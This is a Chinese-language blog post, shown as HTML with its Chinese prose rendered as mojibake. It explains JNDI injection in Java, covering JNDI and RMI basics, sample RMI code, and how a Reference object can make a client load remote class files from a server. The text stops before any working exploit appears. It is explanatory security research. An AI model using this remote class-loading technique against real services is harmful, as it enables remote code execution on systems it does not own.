<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="ï¼ˆä¸¤ä¸ªå¤šæœˆæ²¡äº§å‡ºäº†ï¼Œæ„Ÿè§‰æœ€è¿‘èº«ä½“è¢«æç©º~ï¼‰ BlackHat 2016 (USA) åˆšç»“æŸä¸ä¹…ï¼Œä½œä¸º WebğŸ¶ çš„æˆ‘ç«‹é©¬å»è¿‡äº†ä¸€éä¸ Web ç›¸å…³çš„è®®é¢˜ã€‚Web ç›¸å…³çš„è®®é¢˜ä¹Ÿä¸ç®—å¤ªå¤šï¼Œæ¯”è¾ƒç²¾åçš„å°±æ˜¯ @pentester å¤§ç‰›çš„è®®é¢˜ - â€œA Journey From JNDI LDAP Manipulation To RCEâ€ï¼Œå…¶ä»‹ç»äº† Java ä¸­åˆ©ç”¨ JNDI è¿›è¡Œ RCE çš„å…·ä½“æ€è·¯å’Œæ¡ˆ">
<meta name="keywords" content="security,web,java">
<meta property="og:type" content="article">
<meta property="og:title" content="BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ">
<meta property="og:url" content="http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/index.html">
<meta property="og:site_name" content="rickgray.me">
<meta property="og:description" content="ï¼ˆä¸¤ä¸ªå¤šæœˆæ²¡äº§å‡ºäº†ï¼Œæ„Ÿè§‰æœ€è¿‘èº«ä½“è¢«æç©º~ï¼‰ BlackHat 2016 (USA) åˆšç»“æŸä¸ä¹…ï¼Œä½œä¸º WebğŸ¶ çš„æˆ‘ç«‹é©¬å»è¿‡äº†ä¸€éä¸ Web ç›¸å…³çš„è®®é¢˜ã€‚Web ç›¸å…³çš„è®®é¢˜ä¹Ÿä¸ç®—å¤ªå¤šï¼Œæ¯”è¾ƒç²¾åçš„å°±æ˜¯ @pentester å¤§ç‰›çš„è®®é¢˜ - â€œA Journey From JNDI LDAP Manipulation To RCEâ€ï¼Œå…¶ä»‹ç»äº† Java ä¸­åˆ©ç”¨ JNDI è¿›è¡Œ RCE çš„å…·ä½“æ€è·¯å’Œæ¡ˆ">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/5.png">
<meta property="og:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/6.png">
<meta property="og:updated_time" content="2018-04-24T15:48:57.518Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ">
<meta name="twitter:description" content="ï¼ˆä¸¤ä¸ªå¤šæœˆæ²¡äº§å‡ºäº†ï¼Œæ„Ÿè§‰æœ€è¿‘èº«ä½“è¢«æç©º~ï¼‰ BlackHat 2016 (USA) åˆšç»“æŸä¸ä¹…ï¼Œä½œä¸º WebğŸ¶ çš„æˆ‘ç«‹é©¬å»è¿‡äº†ä¸€éä¸ Web ç›¸å…³çš„è®®é¢˜ã€‚Web ç›¸å…³çš„è®®é¢˜ä¹Ÿä¸ç®—å¤ªå¤šï¼Œæ¯”è¾ƒç²¾åçš„å°±æ˜¯ @pentester å¤§ç‰›çš„è®®é¢˜ - â€œA Journey From JNDI LDAP Manipulation To RCEâ€ï¼Œå…¶ä»‹ç»äº† Java ä¸­åˆ©ç”¨ JNDI è¿›è¡Œ RCE çš„å…·ä½“æ€è·¯å’Œæ¡ˆ">
<meta name="twitter:image" content="http://rickgray.me/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2016/09/22/attacking-distributed-nodes-by-message-queue-injection/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2016/06/01/how-to-scan-and-check-vulnerabilities/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&text=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&is_video=false&description=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ&body=Check out this article: http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&title=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review/&name=BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-JNDI-æ˜¯ä»€ä¹ˆï¼Ÿ"><span class="toc-number">1.</span> <span class="toc-text">0x00 - JNDI æ˜¯ä»€ä¹ˆï¼Ÿ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-JNDI-è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•"><span class="toc-number">1.1.</span> <span class="toc-text">1. JNDI è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RMI-ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç "><span class="toc-number">1.2.</span> <span class="toc-text">2. RMI ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç </span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-JNDI-åè®®åŠ¨æ€è½¬æ¢"><span class="toc-number">2.</span> <span class="toc-text">0x02 JNDI åè®®åŠ¨æ€è½¬æ¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-åˆ©ç”¨-JNDI-æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ"><span class="toc-number">3.</span> <span class="toc-text">0x03 åˆ©ç”¨ JNDI æ³¨å…¥åŠ è½½è¿œç¨‹ä»£ç å¹¶æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-ç®€å•æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">0x04 ç®€å•æ€»ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å‚è€ƒ"><span class="toc-number">5.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        BlackHat 2016 å›é¡¾ä¹‹ JNDI æ³¨å…¥ç®€å•è§£æ
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">rickgray.me</span>
      </span>
      
    <div class="postdate">
        <time datetime="2016-08-18T16:00:00.000Z" itemprop="datePublished">2016-08-19</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>ï¼ˆä¸¤ä¸ªå¤šæœˆæ²¡äº§å‡ºäº†ï¼Œæ„Ÿè§‰æœ€è¿‘èº«ä½“è¢«æç©º~ï¼‰</p>
<p>BlackHat 2016 (USA) åˆšç»“æŸä¸ä¹…ï¼Œä½œä¸º WebğŸ¶ çš„æˆ‘ç«‹é©¬å»è¿‡äº†ä¸€éä¸ Web ç›¸å…³çš„è®®é¢˜ã€‚Web ç›¸å…³çš„è®®é¢˜ä¹Ÿä¸ç®—å¤ªå¤šï¼Œæ¯”è¾ƒç²¾åçš„å°±æ˜¯ <a href="https://twitter.com/pwntester" target="_blank" rel="noopener">@pentester</a> å¤§ç‰›çš„è®®é¢˜ - <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">â€œA Journey From JNDI LDAP Manipulation To RCEâ€</a>ï¼Œå…¶ä»‹ç»äº† Java ä¸­åˆ©ç”¨ JNDI è¿›è¡Œ RCE çš„å…·ä½“æ€è·¯å’Œæ¡ˆä¾‹ï¼Œæ—©åœ¨ä»Šå¹´ 1 æœˆæ—¶å°±å·²ç»çˆ†å‡ºè¿‡ Spring æ¡†æ¶çš„ä¸€ä¸ª RCEï¼Œè¯¥æ¼æ´åŸç†æœ€æ ¹æœ¬å°±æ˜¯åˆ©ç”¨äº† JNDI çš„æ³¨å…¥ï¼Œååºåˆ—åŒ–åªèµ·åˆ°ä¸€ä¸ªè§¦å‘ JNDI æ³¨å…¥çš„ä½œç”¨ã€‚</p>
<p>æœ¬æ–‡åœ¨å­¦ä¹ è®®é¢˜ PPT çš„åŸºç¡€ä¸Šï¼Œç»“åˆè‡ªå·±çš„ä¸€äº›ç†è§£ï¼ŒæŒ‰ç†è®ºåŸºç¡€äº†è§£åˆ°å…·ä½“åˆ©ç”¨å®ç°çš„ä¸€ä¸ªè¿‡ç¨‹è¿›è¡Œå›é¡¾ã€‚ï¼ˆä¹Ÿæ˜¯ä¸€åä¸ä¼š Java çš„ WebğŸ¶ å°è¯•ç†è§£æ¼æ´åŸç†å’Œ EXP æ„é€ çš„ä¸€ä¸ªè®°å½•è¿‡ç¨‹ï¼Œ<strong>æ–‡ç« å†…å®¹å¦‚æœ‰ä¸å½“è¿˜æœ›æŒ‡å‡º</strong>ï¼‰</p>
<h3 id="0x00-JNDI-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#0x00-JNDI-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="0x00 - JNDI æ˜¯ä»€ä¹ˆï¼Ÿ"></a>0x00 - JNDI æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>JNDI - Java Naming and Directory Interface åä¸º Javaå‘½åå’Œç›®å½•æ¥å£ï¼Œå…·ä½“çš„æ¦‚å¿µè¿˜æ˜¯æ¯”è¾ƒå¤æ‚éš¾æ‡‚ï¼Œå…·ä½“ç»“æ„è®¾è®¡ç»†èŠ‚å¯ä»¥ä¸ç”¨äº†è§£ï¼Œç®€å•æ¥è¯´å°±æ˜¯ JNDI æä¾›äº†ä¸€ç»„é€šç”¨çš„æ¥å£å¯ä¾›åº”ç”¨å¾ˆæ–¹ä¾¿åœ°å»è®¿é—®ä¸åŒçš„åç«¯æœåŠ¡ï¼Œä¾‹å¦‚ LDAPã€RMIã€CORBA ç­‰ã€‚å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/1.png" alt=""></p>
<p>åœ¨ Java ä¸­ä¸ºäº†èƒ½å¤Ÿæ›´æ–¹ä¾¿çš„ç®¡ç†ã€è®¿é—®å’Œè°ƒç”¨è¿œç¨‹çš„èµ„æºå¯¹è±¡ï¼Œå¸¸å¸¸ä¼šä½¿ç”¨ LDAP å’Œ RMI ç­‰æœåŠ¡æ¥å°†èµ„æºå¯¹è±¡æˆ–æ–¹æ³•ç»‘å®šåœ¨å›ºå®šçš„è¿œç¨‹æœåŠ¡ç«¯ï¼Œä¾›åº”ç”¨ç¨‹åºæ¥è¿›è¡Œè®¿é—®å’Œè°ƒç”¨ã€‚ä¸ºäº†æ›´å¥½çš„ç†è§£æ•´ä¸ª JNDI æ³¨å…¥äº§ç”Ÿçš„åŸå› ï¼Œä¸‹é¢ç”¨å®é™…ä»£ç æ¥è¯´æ˜ä¸€ä¸‹å¸¸è§„ RMI è®¿é—®å’Œä½¿ç”¨ JNDI è®¿é—® RMI çš„åŒºåˆ«ã€‚ï¼ˆæ›´å¤š JNDI çš„æ¦‚å¿µå¯å‚è€ƒ <a href="http://baike.baidu.com/view/209575.htm" target="_blank" rel="noopener">http://baike.baidu.com/view/209575.htm</a>ï¼‰</p>
<h4 id="1-JNDI-è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•"><a href="#1-JNDI-è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•" class="headerlink" title="1. JNDI è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•"></a>1. JNDI è·å–å¹¶è°ƒç”¨è¿œç¨‹æ–¹æ³•</h4><p>é¦–å…ˆä¸€ä¸ªå¯¹è±¡æ–¹æ³•è¦æƒ³è¢«è¿œç¨‹åº”ç”¨æ‰€è°ƒç”¨éœ€è¦å…¶ extends äº <code>java.rmi.Remote</code> æ¥å£ï¼Œå¹¶éœ€è¦æŠ›å‡º <code>RemoteException</code> å¼‚å¸¸ï¼Œè€Œè¿œç¨‹å¯¹è±¡å¿…é¡»å®ç° <code>java.rmi.server.UniCastRemoteObject</code> ç±»ã€‚é¦–å…ˆåˆ›å»ºä¸€ä¸ª <code>IHello</code> çš„æ¥å£ï¼ˆ<code>IHello.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å†åˆ›å»º <code>IHelloImpl</code> ç±»å®ç° <code>java.rmi.server.UniCastRemoteObject</code> ç±»å¹¶åŒ…å« <code>IHello</code> æ¥å£ï¼ˆ<code>IHelloImpl.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IHelloImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">IHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name + <span class="string">" ^_^ "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åç”¨ RMI ç»‘å®šå®ä¾‹å¯¹è±¡æ–¹æ³•ï¼Œå¹¶ä½¿ç”¨ JNDI å»è·å–å¹¶è°ƒç”¨å¯¹è±¡æ–¹æ³•ï¼ˆ<code>CallService.java</code>ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// é…ç½® JNDI é»˜è®¤è®¾ç½®</span></span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æœ¬åœ°å¼€å¯ 1099 ç«¯å£ä½œä¸º RMI æœåŠ¡ï¼Œå¹¶ä»¥æ ‡è¯† "hello" ç»‘å®šæ–¹æ³•å¯¹è±¡</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        IHello hello = <span class="keyword">new</span> IHelloImpl();</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, hello);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// JNDI è·å– RMI ä¸Šçš„æ–¹æ³•å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">        IHello rHello = (IHello) ctx.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        System.out.println(rHello.sayHello(<span class="string">"RickGray"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å°†ä¸Šé¢ 3 ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ï¼Œå¹¶ä½¿ç”¨ <code>javac *.java</code> è¿›è¡Œç¼–è¯‘ï¼Œç„¶åè¿è¡Œ <code>java CallService</code> å³å¯å¾—åˆ°è¿è¡Œç»“æœã€‚</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/2.png" alt=""></p>
<p>ä½¿ç”¨æ›´ä¸ºç›´è§‚çš„å›¾ç¤ºæ¥æè¿°æ•´ä¸ªæµç¨‹ï¼š</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/3.png" alt=""></p>
<p>è¿™é‡Œåº”ç”¨ä½¿ç”¨ JNDI è·å–è¿œç¨‹ <code>sayHello()</code> å‡½æ•°å¹¶ä¼ å…¥ <code>&quot;RickGray&quot;</code> å‚æ•°è¿›è¡Œè°ƒç”¨æ—¶ï¼ŒçœŸæ­£æ‰§è¡Œè¯¥å‡½æ•°æ˜¯åœ¨è¿œç¨‹æœåŠ¡ç«¯ï¼Œæ‰§è¡Œå®Œæˆåä¼šå°†ç»“æœåºåˆ—åŒ–è¿”å›ç»™åº”ç”¨ç«¯ï¼Œè¿™ä¸€ç‚¹æ˜¯éœ€è¦å¼„æ¸…æ¥šçš„ã€‚</p>
<h4 id="2-RMI-ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç "><a href="#2-RMI-ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç " class="headerlink" title="2. RMI ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç "></a>2. RMI ä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ä»£ç </h4><p>å¦‚æœè¿œç¨‹è·å– RMI æœåŠ¡ä¸Šçš„å¯¹è±¡ä¸º Reference ç±»æˆ–è€…å…¶å­ç±»ï¼Œåˆ™åœ¨å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡å­˜æ ¹å®ä¾‹æ—¶ï¼Œå¯ä»¥ä»å…¶ä»–æœåŠ¡å™¨ä¸ŠåŠ è½½ class æ–‡ä»¶æ¥è¿›è¡Œå®ä¾‹åŒ–ã€‚</p>
<p>Reference ä¸­å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š</p>
<ol>
<li>className - è¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å</li>
<li>classFactory - åŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°</li>
<li>classFactoryLocation - æä¾› classes æ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file/ftp/http ç­‰åè®®</li>
</ol>
<p>ä¾‹å¦‚è¿™é‡Œå®šä¹‰ä¸€ä¸ª Reference å®ä¾‹ï¼Œå¹¶ä½¿ç”¨ç»§æ‰¿äº† <code>UnicastRemoteObject</code> ç±»çš„ <code>ReferenceWrapper</code> åŒ…è£¹ä¸€ä¸‹å®ä¾‹å¯¹è±¡ï¼Œä½¿å…¶èƒ½å¤Ÿé€šè¿‡ RMI è¿›è¡Œè¿œç¨‹è®¿é—®ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"refClassName"</span>, <span class="string">"insClassName"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
<p>å½“æœ‰å®¢æˆ·ç«¯é€šè¿‡ <code>lookup(&quot;refObj&quot;)</code> è·å–è¿œç¨‹å¯¹è±¡æ—¶ï¼Œè·å¾—åˆ°ä¸€ä¸ª Reference ç±»çš„å­˜æ ¹ï¼Œç”±äºè·å–çš„æ˜¯ä¸€ä¸ª Reference å®ä¾‹ï¼Œå®¢æˆ·ç«¯ä¼šé¦–å…ˆå»æœ¬åœ°çš„ <code>CLASSPATH</code> å»å¯»æ‰¾è¢«æ ‡è¯†ä¸º <code>refClassName</code> çš„ç±»ï¼Œå¦‚æœæœ¬åœ°æœªæ‰¾åˆ°ï¼Œåˆ™ä¼šå»è¯·æ±‚ <code>http://example.com:12345/refClassName.class</code> åŠ¨æ€åŠ è½½ classes å¹¶è°ƒç”¨ <code>insClassName</code> çš„æ„é€ å‡½æ•°ã€‚</p>
<p>å€Ÿç”¨å®˜æ–¹çš„æµç¨‹å›¾ï¼š</p>
<p><img src="/images/articles/2016-08-19-jndi-injection-from-theory-to-apply-blackhat-review/4.png" alt=""></p>
<p>è¿™é‡Œè¯´æ˜äº†åœ¨è·å– RMI è¿œç¨‹å¯¹è±¡æ—¶ï¼Œå¯ä»¥åŠ¨æ€åœ°åŠ è½½å¤–éƒ¨ä»£ç è¿›è¡Œå¯¹è±¡ç±»å‹å®ä¾‹åŒ–ï¼Œè€Œ JNDI åŒæ ·å…·æœ‰è®¿é—® RMI è¿åŸå¯¹è±¡çš„èƒ½åŠ›ï¼Œåªè¦å…¶æŸ¥æ‰¾å‚æ•°å³ <code>lookup()</code> å‡½æ•°çš„å‚æ•°å€¼å¯æ§ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ä¿ƒä½¿ç¨‹åºå»åŠ è½½å’Œè‡ªä¿¡éƒ¨ç½²åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šçš„æ¶æ„ä»£ç ã€‚</p>
<h3 id="0x02-JNDI-åè®®åŠ¨æ€è½¬æ¢"><a href="#0x02-JNDI-åè®®åŠ¨æ€è½¬æ¢" class="headerlink" title="0x02 JNDI åè®®åŠ¨æ€è½¬æ¢"></a>0x02 JNDI åè®®åŠ¨æ€è½¬æ¢</h3><p>å‰é¢ç®€å•çš„ç”¨ä»£ç å’Œå›¾ä¾‹è¯´æ˜äº† JNDI çš„åº”ç”¨æ–¹å¼å’Œ RMI ä¸­çš„åŠ¨æ€å­—èŠ‚ä»£ç åŠ è½½ï¼Œåœ¨åˆå§‹åŒ–é…ç½® JNDI è®¾ç½®æ—¶å¯ä»¥é¢„å…ˆæŒ‡å®šå…¶ä¸Šä¸‹æ–‡ç¯å¢ƒï¼ˆRMIã€LDAP æˆ–è€… CORBA ç­‰ï¼‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br></pre></td></tr></table></figure>
